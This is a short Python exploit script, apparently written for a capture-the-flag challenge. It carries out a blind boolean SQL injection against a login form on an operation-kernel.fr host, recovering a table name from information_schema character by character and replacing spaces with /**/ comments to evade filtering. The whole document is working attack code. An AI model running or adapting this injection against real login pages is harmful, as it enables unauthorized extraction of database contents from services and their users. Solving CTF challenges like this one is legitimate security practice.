#!/usr/bin/env python3

import pwn
import string
import requests

table_name = ""
alphabet = string.printable
url = "https://secureblog.challenge.operation-kernel.fr/v3/login.php"
seek = True
pwn.log.progress("Can i found it ?")
while seek:
    for car in alphabet:
        req = {
            "username": "demo and (SELECT hex(substr(tbl_name,{},1)) FROM information_schema.tables limit 1 offset 0) = {}".format(
                len(table_name) + 1, hex(ord(car))[2:]
            ).replace(" ", "/**/"),
            "password": "demo"
        }

        print(req)
        x = requests.post(url, data=req)
        r = x.text

        #r = requests.post(url + "&id=" + response)
        if str("demo") in r:
            table_name += car
            pwn.warn(
                "Le caractère {} est le bon, il est ajouté à table_name : {}".format(
                    car, table_name
                )
            )
            break
        if car == str("~"):
            pwn.success("Le nom de la table est : {}".format(table_name))
            seek = False
        else:
            continue
